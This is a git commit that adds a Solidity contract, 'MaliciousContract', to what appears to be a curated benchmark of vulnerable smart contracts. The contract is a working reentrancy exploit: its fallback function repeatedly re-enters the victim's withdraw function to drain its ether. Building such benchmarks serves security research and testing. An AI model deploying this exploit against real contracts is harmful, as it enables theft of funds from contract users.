63ae9754937b29ccf220bc41d79e00a7c1a45f4f
sofiabobadilla <sofy.bobadilla@gmail.com>
2024-08-14 21:57:50 +0200

    add: attack for reentrance.sol

---
+++ smartbugs-curated/0.4.x/contracts/reentrancy/reentrance_attack.sol
@@ -0,0 +1,30 @@
+pragma solidity ^0.4.18;
+
+import "../dataset/reentrancy/reentrance.sol";
+
+
+contract MaliciousContract{
+    Reentrance reentrance;
+    
+
+    constructor(address _victimAddress) public{
+        reentrance= Reentrance (_victimAddress);
+    }
+
+   function attack(uint amount) public {
+        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+        reentrance.withdraw(amount);
+    }
+
+    function deposit()  public payable{
+        require(msg.value >= 1 ether, "Must add at least 1 ether");
+        reentrance.donate.value(msg.value)(address(this));        
+    }
+
+    function() payable public {
+        // Re-enter the vulnerable function if there's still balance to collect
+        if ( address(reentrance).balance >= 1 ether) {
+            reentrance.withdraw(1 ether);
+        }
+    }
+}
